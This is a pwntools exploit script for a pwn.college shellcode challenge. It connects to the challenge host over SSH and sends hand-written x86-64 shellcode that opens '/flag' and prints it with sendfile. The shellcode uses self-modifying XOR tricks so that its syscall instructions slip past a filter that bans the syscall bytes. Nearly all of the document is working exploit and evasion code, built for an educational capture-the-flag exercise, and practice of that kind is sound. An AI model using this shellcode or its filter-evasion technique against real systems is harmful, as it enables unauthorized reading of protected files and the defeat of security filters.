from pwn import *

e = ELF('./babyshell_level5_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)
p = s.run('/babyshell_level5_teaching1')

context.arch = e.arch
context.os = e.os

pay = shellcraft.open('/flag',0)
pay += shellcraft.sendfile(1,"rax",0,0xff)
print(pay)
pay = f'''
/* open(file='/flag', oflag=0, mode=0) */
/* push b'/flag\x00' */
xor rax, rax
push rax
mov eax, 0x67616c66
shl rax, 8
xor al, 0x2f
xor [rsp], rax
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
/* call open() */
push SYS_open /* 2 */
pop rax
mov r8d, 0x01010101
xor [rip], r8
syscall
/* sendfile(out_fd=1, in_fd='rax', offset=0, count=0xff) */
xor r10d, r10d
mov r10b, 0xff
push 1
pop rdi
xor edx, edx /* 0 */
mov rsi, rax
/* call sendfile() */
push SYS_sendfile /* 0x28 */
pop rax
mov r8d, 0x01010101
xor [rip], r8
syscall

'''
print(pay)
pay = asm(pay).replace(b'\x0f\x05',b'\x0e\x04')
print(pay)
p.send(pay)

p.interactive()